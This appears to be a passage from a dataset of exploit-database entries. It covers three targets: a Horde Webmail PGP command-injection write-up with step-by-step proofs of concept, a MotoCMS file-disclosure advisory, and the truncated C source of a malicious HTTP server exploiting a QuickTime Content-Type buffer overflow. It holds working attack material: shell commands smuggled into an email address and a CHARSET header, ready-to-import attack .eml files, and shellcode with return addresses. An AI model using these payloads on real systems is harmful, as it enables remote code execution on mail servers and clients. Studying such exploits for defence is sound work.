($prefs->getValue('use_pgp') && /* 1696 */ !empty($conf['gnupg']['path']) && /* 1697 */ in_array($encrypt, array(IMP_Crypt_Pgp::ENCRYPT, IMP_Crypt_Pgp::SIGN, IMP_Crypt_Pgp::SIGNENC, IMP_Crypt_Pgp::SYM_ENCRYPT, IMP_Crypt_Pgp::SYM_SIGNENC))) { /* 1698 */ $imp_pgp = $injector->getInstance('IMP_Crypt_Pgp'); /* ... */ /* 1727 */ /* Do the encryption/signing requested. */ /* 1728 */ try { /* 1729 */ switch ($encrypt) { /* ... */ /* 1735 */ case IMP_Crypt_Pgp::ENCRYPT: /* 1736 */ case IMP_Crypt_Pgp::SYM_ENCRYPT: /* 1737 */ $to_list = clone $to; /* 1738 */ if (count($options['from'])) { /* 1739 */ $to_list->add($options['from']); /* 1740 */ } /* 1741 */ $base = $imp_pgp->IMPencryptMIMEPart($base, $to_list, ($encrypt == IMP_Crypt_Pgp::SYM_ENCRYPT) ? $symmetric_passphrase : null); /* 1742 */ break;  Here we can see validation (1695-1696 lines) that:  Current user has enabled “use_pgp” feature in his preferences (it is not a problem as an attacker can edit his own preferences) $conf[‘gnupg’][‘path’] is not empty. This value can be edited only by admin. So if we don’t have value here our server is not vulnerable. But if admin wants to allow users to use GPG feature he/she needs to define value for this config.  Also we can see that in lines 1737-1739 to our recipient list will be added address “from” as well.  Path: /imp/lib/Crypt/Pgp.php  /* 584 */ public function impEncryptMimePart($mime_part, /* 585 */ Horde_Mail_Rfc822_List $addresses, /* 586 */ $symmetric = null) /* 587 */ { /* 588 */ return $this->encryptMimePart($mime_part, $this->_encryptParameters($addresses, $symmetric)); /* 589 */ }  Before encryptMimePart() call Horde uses _encryptParameters()  Path: /imp/lib/Crypt/Pgp.php  /* 536 */ protected function _encryptParameters(Horde_Mail_Rfc822_List $addresses, /* 537 */ $symmetric) /* 538 */ { /* ... */ /* 546 */ $addr_list = array(); /* 548 */ foreach ($addresses as $val) { /* 549 */ /* Get the public key for the address. */ /* 550 */ $bare_addr = $val->bare_address; /* 551 */ $addr_list[$bare_addr] = $this->getPublicKey($bare_addr); /* 552 */ } /* 554 */ return array('recips' => $addr_list); /* 555 */ }  Horde will add to each address its Public Key. There a few source of Public Keys:  AddressBook (we will use this source) Servers with Public Keys  Note that Horde should be able to find Public Key for our “From” address as well. We can generate pair of PGP keys (https is required) or we can use the same trick with AddressBook (we can create some contact, add any valid Public PGP key, and add this address to default identity) encryptMimePart() will call encrypt() method  Path: /Horde/Crypt/Pgp.php  /* 773 */ public function encryptMIMEPart($mime_part, $params = array()) /* 774 */ { /* 775 */ $params = array_merge($params, array('type' => 'message')); /* … */ /* 781 */ $message_encrypt = $this->encrypt($signenc_body, $params);  It will call encryptMessage()  Path: /Horde/Crypt/Pgp.php  /* 554 */ public function encrypt($text, $params = array()) /* 555 */ { /* 556 */ switch (isset($params['type']) ? $params['type'] : false) { /* 557 */ case 'message': /* 558 */ $error = Horde_Crypt_Translation::t( /* 559 */ ""Could not PGP encrypt message."" /* 560 */ ); /* 561 */ $func = 'encryptMessage'; /* 562 */ break; /* ... */ /* 586 */ $this->_initDrivers(); /* 587 */ /* 588 */ foreach ($this->_backends as $val) { /* 589 */ try { /* 590 */ return $val->$func($text, $params); /* 591 */ } catch (Horde_Crypt_Exception $e) {} /* 592 */ }  In conclusions: If Horde server has enabled “GnuPG feature” any unprivileged user is able to execute arbitrary code.  Enable GPG feature for attacker account (“Enable PGP functionality?” checkbox on “PGP Configure PGP encryption support.” section in Prefferences->Mail page ) Create some contact in the attacker AddressBook, add any valid Public PGP key, and add this address to default identity Create another contact in the attacker AddressBook, add any valid Public PGP key, and change email address to some$(desired command to execute) contact@somedomain.com Create a new message to some$(desired command to execute) contact@somedomain.com Choose Encryption:PGP Encrypt Message option Click Send button  And desired command will be executed on the Horde server.  Proof of Concept – Authenticated Code Execution  For Proof of Concept we can use preconfigured image of Horde server from Bitnami (Bitnami – “Easy to use cloud images, containers, and VMs that work on any platform”):  https://downloads.bitnami.com/files/stacks/horde/5.2.17-0/bitnami-horde-5.2.17-0-linux-ubuntu-14.04-x86_64.ova  Step 1 – Login as admin (by default user:bitnami) and go to Administration -> Configuration and choose Horde (horde). Open GnuPG tab, enter /usr/bin/gpg into $conf[gnupg][path] setting and click “Generate Horde Configuration“:  Now we have enabled GPG feature on our server and we can login as regular user and try to execute desired commands. But Bitnami image does not have installed and configured Mail server so we need to use external one or install it on local machine.  We will use gmail account (to be able to login to it from Horde I had to change Gmail account setting Allow less secure apps: ON).  To use external Mail server we need to change the next setting: “Administrator Panel” -> “Configuration” -> “Horde” -> “Authentication”  Step 2 – Configure Horde web-mail authentication ($conf[auth][driver]) to “Let a Horde application handle authentication” and click “Generate Horde Configuration”:  Step 3 – logout and login with your gmail account. Currently we are login as regular user so we can try to execute desired commands:  Go to Preferences -> Mail and click on PGP link. Check Enable PGP functionality? checkbox and click “Save”:  Create “from” contact in our AddressBook: “Address Book -> New Contact -> in Address Book of …”  Personal tab – Last Name: mymailboxwithPGPkey Communication tab – Email: mymailboxwihPGP@any.com Other tab – PGP Public Key: any valid Public PGP key.  For example:  -----BEGIN PGP PUBLIC KEY BLOCK----- Version: SKS 1.1.6 Comment: Hostname: keyserver.ubuntu.com mQGiBDk89iARBADhB7AyHQ/ZBlZjRRp1/911XaXGGmq1LDLTUTCAbJyQ1TzKDdetfT9Szk01 YPdAnovgzxTS89svuVHP/BiqLqhJMl2FfMLcJX+va+DujGuLDCZDHi+4czc33N3z8ArpxzPQ 5bfALrpNMJi6v2gZkDQAjMoeKrNEfXLCXQbTYWCuhwCgnZZCThya4xhmlLCTkwsQdMjFoj8D /iOIP/6W27opMJgZqTHcisFPF6Kqyxe6GAftJo6ZtLEG26k2Qn3O0pghDz2Ql4aDVki3ms82 z77raSqbZVJzAFPzYoIKuc3JOoxxE+SelzSzj4LuQRXYKqZzT8/qYBCLg9cmhdm8PnwE9fd/ POGnNQFMk0i2xSz0FMr9R1emIKNsA/454RHIZ39ebvZzVULS1pSo6cI7DAJFQ3ejJqEEdAbr 72CW3eFUAdF+4bJQU/V69Nr+CmziBbyqKP6HfiUH9u8NLrYuK6XWXLVVSCBPsOxHxhw48hch zVxJZ5Cyo/tMSOY/CxvLL/vMoT2+kQX1SCsWALosKJyOGbpCJmPasOLKdrQnQWxpY2UgKFJl Y2h0c2Fud8OkbHRpbikgPGFsaWNlQGN5Yi5vcmc+iEYEEBECAAYFAjk+IEgACgkQzDSD4hsI fQSaWQCgiDvvnRxa8XFOKy/NI7CKL5X4D28An2k9Cbh+dosXvB5zGCuQiAkLiQ+CiEYEEREC AAYFAkKTPFcACgkQCY+3LE2/Ce4l+gCdFSHqp5HQCMKSOkLodepoG0FiQuwAnR2nioCQ3A5k YI0NfUth+0QzJs1ciFYEExECABYFAjk89iAECwoEAwMVAwIDFgIBAheAAAoJEFsqCm37V5ep fpAAoJezEplLlaGQHM8ppKReVHSyGuX+AKCYwRcwJJwoQHM8p86xhSuC/opYPoheBBMRAgAW BQI5PPYgBAsKBAMDFQMCAxYCAQIXgAASCRBbKgpt+1eXqQdlR1BHAAEBfpAAoJezEplLlaGQ HM8ppKReVHSyGuX+AKCYwRcwJJwoQHM8p86xhSuC/opYPrkBDQQ5PPYqEAQArSW27DriJAFs Or+fnb3VwsYvznFfEv8NJyM/9/lDYfIROHIhdKCWswUWCgoz813RO2taJi5p8faM048Vczu/ VefTzVrsvpgXUIPQoXjgnbo6UCNuLqGk6TnwdJPPNLuIZLBEhGdA+URtFOA5tSj67h0G4fo0 P8xmsUXNgWVxX/MAAwUD/jUPLFgQ4ThcuUpxCkjMz+Pix0o37tOrFOU/H0cn9SHzCQKxn+iC sqZlCsR+qXNDl43vSa6Riv/aHtrD+MJLgdIVkufuBWOogtuojusnFGY73xvvM1MfbG+QaUqw gfe4UYOchLBNVtfN3WiqSPq5Yhue4m1u/xIvGGJQXvSBxNQyiEYEGBECAAYFAjk89ioACgkQ WyoKbftXl6kV5QCfV7GjnmicwJPgxUQbDMP9u5KuVcsAn3aSmYyI1u6RRlKoThh0WEHayISv iE4EGBECAAYFAjk89ioAEgkQWyoKbftXl6kHZUdQRwABARXlAJ9XsaOeaJzAk+DFRBsMw/27 kq5VywCfdpKZjIjW7pFGUqhOGHRYQdrIhK8= =RHjX -----END PGP PUBLIC KEY BLOCK-----  Click “Add” button:  Go to Preferences -> Global Preferences and click on Personal Information link. Put mymailboxwihPGP@any.com into field The default e-mail address to use with this identity and Click “Save”:  Create our “to” contact in our AddressBook: “Address Book -> New Contact -> in Address Book of …”  Personal tab – Last Name: contact_for_attack Communication tab – Email: hereinj@any.com Other tab – PGP Public Key: any valid Public PGP key (it can be the same as in the previous step) And click “Add” button:  Inject our command: Click on Edit. Go to Communication Tab, put cursor in Email field and chose “Inspect Element (Q)” from context menu:  Delete “email” from the type argument and close Inspector:  1 <input name=""object[email]"" id=""object_email_"" value=""hereinj@any.com"" type=""email"">  Edit the address as we want – for example hereinj$(touch /tmp/hereisvuln)@any.com and click “Save”:  Create a new message ( Mail -> New Message) with our contact as recipient:  Choose PGP Encrypt Message in Encryption option:  Enter any subject and any content. Click “Send”  We will get “PGP Error:…”  It is ok – let’s check our server:  We have a new file “hereisvuln” so our command was executed.  Unauthentication Remote Code Execution Horde Webmail contains a vulnerability that allows a remote attacker to execute arbitrary code with the privileges of the user who runs the web server.  Vulnerable code: decryptSignature() function of GPG feature.  Path: /Horde/Crypt/Pgp/Backend/Binary.php:  /* 539 */ public function decryptSignature($text, $params) /* 540 */ { /* ... */ /* 550 */ /* Options for the GPG binary. */ /* 551 */ $cmdline = array( /* 552 */ '--armor', /* 553 */ '--always-trust', /* 554 */ '--batch', /* 555 */ '--charset ' . (isset($params['charset']) ? $params['charset'] : 'UTF-8'), /* 556 */ $keyring, /* 557 */ '--verify' /* 558 */ ); /* ... */ /* 571 */ $result = $this->_callGpg($cmdline, 'r', null, true, true, true); /* ... */  $params[‘charset’] will be added to $cmdline array and passed to _callGpg():  /* 642 */ public function _callGpg( /* 643 */ $options, $mode, $input = array(), $output = false, $stderr = false, /* 644 */ $parseable = false, $verbose = false /* 645 */ ) /* 646 */ { /* … */ /* 675 */ $cmdline = implode(' ', array_merge($this->_gnupg, $options)); /* … */ /* 681 */ if ($mode == 'w') { /* … */ /* 704 */ } elseif ($mode == 'r') { /* 705 */ if ($fp = popen($cmdline, 'r')) { /* … */  Our $params[‘charset’] will be in command line that is going to be executed.  decryptSignature() is called from decrypt() method:  Path – /Horde/Crypt/Pgp.php:  /* 611 */ public function decrypt($text, $params = array()) /* 612 */ { /* 613 */ switch (isset($params['type']) ? $params['type'] : false) { /* 614 */ case 'detached-signature': /* 615 */ case 'signature': /* 616 */ /* Check for required parameters. */ /* 617 */ if (!isset($params['pubkey'])) { /* 618 */ throw new InvalidArgumentException( /* 619 */ 'A public PGP key is required to verify a signed message.' /* 620 */ ); /* 621 */ } /* 622 */ if (($params['type'] === 'detached-signature') && /* 623 */ !isset($params['signature'])) { /* 624 */ throw new InvalidArgumentException( /* 625 */ 'The detached PGP signature block is required to verify the signed message.' /* 626 */ ); /* 627 */ } /* 628 */ /* 629 */ $func = 'decryptSignature'; /* 630 */ break; /* ... */ /* 650 */ $this->_initDrivers(); /* 651 */ /* 652 */ foreach ($this->_backends as $val) { /* 653 */ try { /* 654 */ return $val->$func($text, $params); /* 655 */ } catch (Horde_Crypt_Exception $e) {} /* 656 */ } /* ... */  decrypt() with needed parameters is used in verifySignature():  Path – /imp/lib/Crypt/Pgp.php  /* 339 */ public function verifySignature($text, $address, $signature = '', /* 340 */ $charset = null) /* 341 */ { /* 342 */ if (!empty($signature)) { /* 343 */ $packet_info = $this->pgpPacketInformation($signature); /* 344 */ if (isset($packet_info['keyid'])) { /* 345 */ $keyid = $packet_info['keyid']; /* 346 */ } /* 347 */ } /* 349 */ if (!isset($keyid)) { /* 350 */ $keyid = $this->getSignersKeyID($text); /* 351 */ } /* 353 */ /* Get key ID of key. */ /* 354 */ $public_key = $this->getPublicKey($address, array('keyid' => $keyid)); /* 356 */ if (empty($signature)) { /* 357 */ $options = array('type' => 'signature'); /* 358 */ } else { /* 359 */ $options = array('type' => 'detached-signature', 'signature' => $signature); /* 360 */ } /* 361 */ $options['pubkey'] = $public_key; /* 363 */ if (!empty($charset)) { /* 364 */ $options['charset'] = $charset; /* 365 */ } /* 369 */ return $this->decrypt($text, $options); /* 370 */ }  verifySignature() is called from _outputPGPSigned():  Path – /imp/lib/Mime/Viewer/Pgp.php  /* 387 */ protected function _outputPGPSigned() /* 388 */ { /* 389 */ global $conf, $injector, $prefs, $registry, $session; /* 390 */ /* 391 */ $partlist = array_keys($this->_mimepart->contentTypeMap()); /* 392 */ $base_id = reset($partlist); /* 393 */ $signed_id = next($partlist); /* 394 */ $sig_id = Horde_Mime::mimeIdArithmetic($signed_id, 'next'); /* 395 */ /* 396 */ if (!$prefs->getValue('use_pgp') || empty($conf['gnupg']['path'])) { /* 397 */ return array( /* 398 */ $sig_id => null /* 399 */ ); /* 400 */ } /* ... */ /* 417 */ if ($prefs->getValue('pgp_verify') || /* 418 */ $injector->getInstance('Horde_Variables')->pgp_verify_msg) { /* 419 */ $imp_contents = $this->getConfigParam('imp_contents'); /* 420 */ $sig_part = $imp_contents->getMIMEPart($sig_id); /* ... */ /* 433 */ try { /* 434 */ $imp_pgp = $injector->getInstance('IMP_Crypt_Pgp'); /* 435 */ if ($sig_raw = $sig_part->getMetadata(Horde_Crypt_Pgp_Parse::SIG_RAW)) { /* 436 */ $sig_result = $imp_pgp->verifySignature($sig_raw, $this->_getSender()->bare_address, null, $sig_part- > getMetadata(Horde_Crypt_Pgp_Parse::SIG_CHARSET)); /* ... */  And it is used in _renderInline():  Path – /imp/lib/Mime/Viewer/Pgp.php  /* 134 */ protected function _renderInline() /* 135 */ { /* 136 */ $id = $this->_mimepart->getMimeId(); /* 138 */ switch ($this->_mimepart->getType()) { /* ... */ /* 142 */ case 'multipart/signed': /* 143 */ return $this->_outputPGPSigned();  Let’s go back to _outputPGPSigned() method. We can see a few requirements before the needed call:  $conf[‘gnupg’][‘path’] should be not empty. This value can be edited only by admin(if he/she wants to allow users to use GPG feature he/she needs to define value for this config). Current user has enabled “use_pgp” feature in his preferences Current user has enabled “pgp_verify” feature in his preferences Current user has enabled “pgp_verify” feature in his preferences  Also we see that our charset value is taken from $sig_part -> getMetadata(Horde_Crypt_Pgp_Parse::SIG_CHARSET)  Our value will be stored during parsing of PGP parts:  Path – /Horde/Crypt/Pgp/Parse.php  /* 150 */ public function parseToPart($text, $charset = 'UTF-8') /* 151 */ { /* 152 */ $parts = $this->parse($text); /* ... */ /* 162 */ while (list(,$val) = each($parts)) { /* 163 */ switch ($val['type']) { /* ... */ /* 200 */ case self::ARMOR_SIGNED_MESSAGE: /* 201 */ if ((list(,$sig) = each($parts)) && /* 202 */ ($sig['type'] == self::ARMOR_SIGNATURE)) { /* 203 */ $part = new Horde_Mime_Part(); /* 204 */ $part->setType('multipart/signed'); /* 205 */ // TODO: add micalg parameter /* 206 */ $part->setContentTypeParameter('protocol', 'application/pgp-signature'); /* 207 */ /* 208 */ $part1 = new Horde_Mime_Part(); /* 209 */ $part1->setType('text/plain'); /* 210 */ $part1->setCharset($charset); /* 211 */ /* 212 */ $part1_data = implode(""\n"", $val['data']); /* 213 */ $part1->setContents(substr($part1_data, strpos($part1_data, ""\n\n"") + 2)); /* 214 */ /* 215 */ $part2 = new Horde_Mime_Part(); /* 216 */ /* 217 */ $part2->setType('application/pgp-signature'); /* 218 */ $part2->setContents(implode(""\n"", $sig['data'])); /* 219 */ /* 220 */ $part2->setMetadata(self::SIG_CHARSET, $charset); /* 221 */ $part2->setMetadata(self::SIG_RAW, implode(""\n"", $val['data']) . ""\n"" . implode(""\n"", $sig['data'])); /* 222 */ /* 223 */ $part->addPart($part1); /* 224 */ $part->addPart($part2); /* 225 */ $new_part->addPart($part); /* 226 */ /* 227 */ next($parts); /* 228 */ } /* 229 */ } /* 230 */ } /* 231 */ /* 232 */ return $new_part; /* 233 */ }  It is called from _parsePGP():  Path – /imp/lib/Mime/Viewer/Plain.php  × 1 2 3 4 5 6 7 8 /* 239 */ protected function _parsePGP() /* 240 */ { /* 241 */ $part = $GLOBALS['injector']->getInstance('Horde_Crypt_Pgp_Parse')->parseToPart( /* 242 */ new Horde_Stream_Existing(array( /* 243 */ 'stream' => $this->_mimepart->getContents(array('stream' => true)) /* 244 */ )), /* 245 */ $this->_mimepart->getCharset() /* 246 */ );  Our charset value is taken from CHARSET attribute of Content-Type header of parent MIMEpart.  _parsePGP() is used in _getEmbeddedMimeParts() method and from Horde Webmail ver 5.2.0 it looks like:  Path – /imp/lib/Mime/Viewer/Plain.php  /* 222 */ protected function _getEmbeddedMimeParts() /* 223 */ { /* 224 */ $ret = $this->getConfigParam('pgp_inline') /* 225 */ ? $this->_parsePGP() /* 226 */ : null;  We can see an additional requirement – our function will be called only if ‘pgp_inline‘ config parameter is “true”. It is defined in:  Path – /imp/config/mime_drivers.php  /* 37 */ /* Scans the text for inline PGP data. If true, will strip this data /* 38 */ * out of the output (and, if PGP is active, will display the /* 39 */ * results of the PGP action). */ /* 40 */ 'pgp_inline' => false  Default value is false, so the major part of Horde servers is not vulnerable and our attack is relevant only if an admin manually has changed this line to ‘pgp_inline‘ => true.  But in older versions (before 5.2.0) the code of _getEmbeddedMimeParts() is a bit different:  Path – /imp/lib/Mime/Viewer/Plain.php  /* 227 */ protected function _getEmbeddedMimeParts() /* 228 */ { /* 229 */ $ret = null; /* 230 */ /* 231 */ if (!empty($GLOBALS['conf']['gnupg']['path']) && /* 232 */ $GLOBALS['prefs']->getValue('pgp_scan_body')) { /* 233 */ $ret = $this->_parsePGP(); /* 234 */ }  So instead of requirement to have config parameter we have requirement of ‘pgp_scan_body‘ Preference of current user. And it is more likely to find a victim with needed preferences. We saw where our injected command is executed and from where and when it is taken  During rendering of massage we:  Will parse PGP values:  #0 IMP_Mime_Viewer_Plain->_parsePGP() called at [/imp/lib/Mime/Viewer/Plain.php:225] #1 IMP_Mime_Viewer_Plain->_getEmbeddedMimeParts() called at [/Horde/Mime/Viewer/Base.php:298] #2 Horde_Mime_Viewer_Base->getEmbeddedMimeParts() called at [/imp/lib/Contents.php:1114] #3 IMP_Contents->_buildMessage() called at [/imp/lib/Contents.php:1186] #4 IMP_Contents->getContentTypeMap() called at [/imp/lib/Contents.php:1423] #5 IMP_Contents->getInlineOutput() called at [/imp/lib/Ajax/Application/ShowMessage.php:296]  Will use them in:  #0 IMP_Mime_Viewer_Plain->_parsePGP() called at [/imp/lib/Mime/Viewer/Plain.php:225] #0 IMP_Mime_Viewer_Pgp->_renderInline() called at [/Horde/Mime/Viewer/Base.php:156] #1 Horde_Mime_Viewer_Base->render() called at [/Horde/Mime/Viewer/Base.php:207] #2 Horde_Mime_Viewer_Base->_renderInline() called at [/Horde/Mime/Viewer/Base.php:156] #3 Horde_Mime_Viewer_Base->render() called at [/imp/lib/Contents.php:654] #4 IMP_Contents->renderMIMEPart() called at [/imp/lib/Contents.php:1462] #5 IMP_Contents->getInlineOutput() called at [/imp/lib/Ajax/Application/ShowMessage.php:296]]  In conclusions:  If Horde server has vulnerable configuration:  Enabled “GnuPG feature” (there is path to gpg binary in $conf[gnupg][path] setting) Only for ver 5.2.0 and newer: ‘pgp_inline’ => true, in /imp/config/mime_drivers.php  And the victim has checked the next checkbox in his/her preferences ( “PGP Configure PGP encryption support.” in Prefferences->Mail) :  “Enable PGP functionality” “Should PGP signed messages be automatically verified when viewed?” if it is not checked our command will be executed when the victim clicks on the link “Click HERE to verify the message.” For versions before 5.2.0: “Should the body of plaintext message be scanned for PGP data”  An attacker can create email with PGP data, put desired command into CHARSET attribute of ContentType header, and this command will be executed on Horde server when the victim opens this email.  Proof of Concept – Remote Code Execution  For Proof of Concept we can use preconfigured image of Horde server from Bitnami (Bitnami – “Easy to use cloud images, containers, and VMs that work on any platform”):  https://downloads.bitnami.com/files/stacks/horde/5.2.17-0/bitnami-horde-5.2.17-0-linux-ubuntu-14.04-x86_64.ova  Step 1 – Login as admin (by default user:bitnami) and go to Administration -> Configuration and choose Horde (horde). Open GnuPG tab, enter /usr/bin/gpg into $conf[gnupg][path] setting and click “Generate Horde Configuration“:  Now we have enabled GPG feature on our server and we can login as regular user and try to execute desired commands. But Bitnami image does not have installed and configured Mail server so we need to use external one or install it on local machine.  We will use gmail account (to be able to login to it from Horde I had to change Gmail account setting Allow less secure apps: ON).  To use external Mail server we need to change the next setting: “Administrator Panel” -> “Configuration” -> “Horde” -> “Authentication”  Configure the application authentication ($conf[auth][driver]) – change this option to “Let a Horde application handle authentication” and click “Generate Horde Configuration”.  If we have Horde Webmail ver 5.2.0 or newer we need to edit /imp/config/mime_drivers.php file. Login to the console of bitnami image (default bitnami:bitnami) and run the next command:  sudo nano /opt/bitnami/apps/horde/htdocs/imp/config/mime_drivers.php  Change the line: “‘pgp_inline’ => false” to “‘pgp_inline’ => true” and save the changes.  Step 2 – Logout and login with your gmail account.  Step 3 – Go to Preferences -> Mail and click on PGP link:  Check Enable PGP functionality checkbox and click “Save” Check Should PGP signed messages be automatically verified when viewed checkbox For versions before 5.2.0 check “Should the body of plain-text message be scanned for PGP data” checkbox Click “Save”  For version before 5.2.0:  Step 4 – Go to the Mail, take any mail folder (for example Drafts), and chose “Import” item from context menu and import attack_whoami.eml file (in the end of this blog).  Click on the imported email:  Our Horde serve is launched under daemon user  Step 5 – We can do the same with attack_touch.eml (in the end of this blog) file (import it and click on the new mail) and check /tmp folder:  attack_touch.eml  Date: Fri, 04 Nov 2016 16:04:19 +0000 Message-ID: <20161104160419.Horde.HpYObg_3-4QS-nUzWujEkg3@ubvm.mydomain.com> From: Donald Trump <attacker@attacker.com> To: SomeUser@mydoamin.com Subject: PGP_INLine_touch_tmp_youarevuln X-IMP-Draft: Yes Content-Type: text/plain; CHARSET=""US-ASCII`touch /tmp/youarevuln`""; format=flowed; DelSp=Yes MIME-Version: 1.0 Content-Disposition: inline   -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  This is a sample of a clear signed message.  -----BEGIN PGP SIGNATURE----- Version: 2.6.2  iQCVAwUBMoSCcM4T3nOFCCzVAQF4aAP/eaP2nssHHDTHyPBSjgwyzryguwBd2szF U5IFy5JfU+PAa6NV6m/UWW8IKczNX2cmaKQNgubwl3w0odFQPUS+nZ9myo5QtRZh DztuhjzJMEzwtm8KTKBnF/LJ9X05pSQUvoHfLZ/waJdVt4E/xfEs90l8DT1HDdIz CvynscaD+wA= =Xb9n -----END PGP SIGNATURE-----  attack_whoami.eml  Date: Fri, 04 Nov 2016 16:04:19 +0000 Message-ID: <20161104160419.Horde.HpYObg_3-4QS-nUzWujEkg3@ubvm.mydomain.com> From: Donald Trump <attacker@attacker.com> To: SomeUser@mydoamin.com Subject: PGP_INLine_whoami X-IMP-Draft: Yes Content-Type: text/plain; CHARSET=US-ASCII`whoami`; format=flowed; DelSp=Yes MIME-Version: 1.0 Content-Disposition: inline   -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  This is a sample of a clear signed message.  -----BEGIN PGP SIGNATURE----- Version: 2.6.2  iQCVAwUBMoSCcM4T3nOFCCzVAQFJaAP/eaP2nssHHDTHyPBSjgwyzryguwBd2szF U5IFy5JfU+PAa6NV6m/UWW8IKczNX2cmaKQNgubwl3w0odFQPUS+nZ9myo5QtRZh DztuhjzJMEzwtm8KTKBnF/LJ9X05pSsUvoHfLZ/waJdVt4E/xfEs90l8DT1HDdIz CvynscaD+wA= =Xb9n -----END PGP SIGNATURE-----",put desired command into CHARSET attribute of ContentType header,1
38152,"MotoCMS - 'admin/data/users.xml' Access Restriction / Information Disclosure source: https://www.securityfocus.com/bid/57055/info  MotoCMS is prone to a file-disclosure and an arbitrary file-upload vulnerability.  An attacker can exploit these issues to upload a file and view local files in the context of the web server process, which may aid in further attacks.  MotoCMS 1.3.3 and prior versions are vulnerable.   http://www.example.com/admin/data/users.xml",upload a file and view local files in the context of the web server process,1
21286,"Apple QuickTime 5.0 - Content-Type Remote Buffer Overflow // source: https://www.securityfocus.com/bid/4064/info  Apple QuickTime is a freely available media player. It runs on a number of platforms including MacOS and Windows 9x/ME/NT/2000/XP operating systems.  Apple QuickTime For Windows does not perform sufficient bounds checking of the ""Content-Type"" header. This issue may be exploited if a server responds with a maliciously crafted ""Content-Type"" header to a HTTP request for a media file. A ""Content-Type"" header of 500+ characters is sufficient to trigger this condition, causing stack variables to be overwritten in the process.  This issue may allow a malicious server to execute arbitrary attacker-supplied code on the host of a client who makes a request for a media file. This may result in a remote compromise, possibly with elevated privileges (depending on the environment). This issue may also allow a hostile server to introduce malicious code into a system running the vulnerable software.  Exploitation of this issue requires that a user makes a request to the malicious server. However, this may also be exploited by a malicious host that is serving streaming media content to the client.  It should be noted that the QuickTime player broadcasts information about the version and the operating environment via the ""User-Agent"" header of the HTTP request, which may aid a malicious server in successfully exploiting this issue.  This vulnerability was reported for Japanese versions of Apple QuickTime Player, running on Japanese versions of the Microsoft Operating System. It is not known if other versions and environments are affected.   /*======================================================================    Apple QuickTimePlayer 5.02/5.01 Exploit      for Windows XP Home edition          Windows2000 Professional (Service Pack 2)          Windows98 Second Edition    The Shadow Penguin Security (http://www.shadowpenguin.org)    Written by UNYUN (unyun@shadowpenguin.org)   ======================================================================= */ #include <windows.h> #include <windowsx.h> #include <stdio.h> #include <winsock.h>  #define SERVICE_PORT    2222 #define MAXBUF          4096 #define TGTBUFSIZE      500 #define NOP             0x90 #define RETOFS          456 #define CODEOFS         470 #define RETADR_2000pro  0x77e0af64 #define RETADR_XPhome   0x77e4fb71 #define RETADR_98SE     0xbfb92995  #define UA_2000PRO      ""Windows NT 5.0Service Pack 2"" #define UA_XPHOME       ""Windows NT 5.1"" #define UA_98SE         ""Windows 98 A ""  #define ANSWER \ ""HTTP/1.1 200 OK\r\n""\ ""Date: Wed, 06 Feb 2002 06:56:30 GMT\r\n""\ ""Server: Apache/1.3.19\r\n""\ ""Last-Modified: Tue, 15 May 2001 13:37:51 GMT\r\n""\ ""ETag: \""1e001d-7b5-3b01312f\""\r\n""\ ""Accept-Ranges: bytes\r\n""\ ""Content-Length: 1973\r\n""\ ""Content-Type: %s\r\n\r\n""  static unsigned char egg_2000pro[512]={   0xB8,0xA5,0xFA,0xE1,0x77,0x33,0xDB,0xB3,   0x04,0x53,0x53,0xFF,0xD0,0x90,0xEB,0xFD }; static unsigned char egg_XPhome[512]={   0xB8,0xe3,0x02,0xd4,0x77,0x33,0xDB,0xB3,   0x04,0x53,0x53,0xFF,0xD0,0x90,0xEB,0xFD }; static unsigned char egg_98se[512]={   0xB8,0x2c,0x23,0xf5,0xbf,0x33,0xDB,0xB3,   0x05,0x53,0x53,0xFF,0xD0,0x90,0xEB,0xFD };  int main(int argc,char *argv[]) {     WSADATA         wsa;     SOCKADDR_IN     sAddr,clientAddr;     SOCKET          sock_listen,sock;     int             nClientAddrLen=sizeof(clientAddr);     static char     packetbuf[MAXBUF*2];     static char     buf[MAXBUF],recvbuf[MAXBUF];     int             r;     unsigned int    eip;     char            *p,*q,*qtver,*os;     unsigned char   *egg;      // Create socket and wait connection     WSAStartup(MAKEWORD(2,0),&wsa);     sock_listen=socket(AF_INET,SOCK_STREAM,0);     sAddr.sin_family        = AF_INET;     sAddr.sin_addr.s_addr   = htonl(INADDR_ANY);     sAddr.sin_port          = htons((u_short)(SERVICE_PORT));     bind(sock_listen,(SOCKADDR *)&sAddr,sizeof(sAddr));     listen(sock_listen,1);     printf(""Waiting connection (Port %d)...\n"",SERVICE_PORT);     sock=accept(sock_listen,(LPSOCKADDR)&clientAddr,&nClientAddrLen);     printf(""Accepted [from %s].\n"",inet_ntoa(clientAddr.sin_addr));      // Recv request     if ((r=recv(sock,recvbuf,sizeof(recvbuf)-1,0))==SOCKET_ERROR){         printf(""Can not recv packet\n"");         return(0);     }     recvbuf[r]='\0';     printf(""---request------------------------------\n"");     printf(""%s\n"",recvbuf);     printf(""----------------------------------------\n"");     if ((p=strstr(recvbuf,""User-Agent:""))==NULL){         printf(""Can not select\n"");         printf(""%s\n"",recvbuf);         exit(1);     }     if ((q=strchr(p,'\r'))!=NULL) *q='\0';     if ((qtver=strstr(p,""qtver=""))==NULL){         printf(""Version is not written in User-Agent\n"");         printf(""%s\n"",p);         exit(1);     }     qtver+=6;     if ((q=strchr(qtver,';'))!=NULL) *q='\0';     printf(""Client version = '%s'\n"",qtver);     q++;     if ((p=strchr(q,')'))!=NULL) *p='\0';     if ((os=strstr(q,""os=""))==NULL){         printf(""OS name is not written in User-Agent\n"");         printf(""%s\n"",q);         exit(1);     }     os+=3;     printf(""Client OS = '%s'\n"",os);      if (!strcmp(os,UA_XPHOME)){         eip=RETADR_XPhome;         egg=egg_XPhome;         printf(""Target = WindowsXp Home\n"");     }else if (!strcmp(os,UA_2000PRO)){         eip=RETADR_2000pro;         egg=egg_2000pro;         printf(""Target = Windows2000 Professional (SP2)\n"");     }else if (!strcmp(os,UA_98SE)){         eip=RETADR_98SE;         egg=egg_98se;         printf(""Target = Windows98 Second Edition\n"");     }else{         eip=RETADR_2000pro;         egg=egg_2000pro;         printf(""Target = Unknown.\n"");     }      // Make exploit     memset(buf,NOP,sizeof(buf));     buf[RETOFS  ]=eip&0xff;     buf[RETOFS+1]=(eip>>8)&0xff;     buf[RETOFS+2]=(eip>>16)&0xff;     buf[RETOFS+3]=(eip>>24)&0xff;     strncpy(buf+CODEOFS,egg,strlen(egg));     buf[TGTBUFSIZE]='\0';      // Send exploit     sprintf(packetbuf,ANSWER,buf);     if 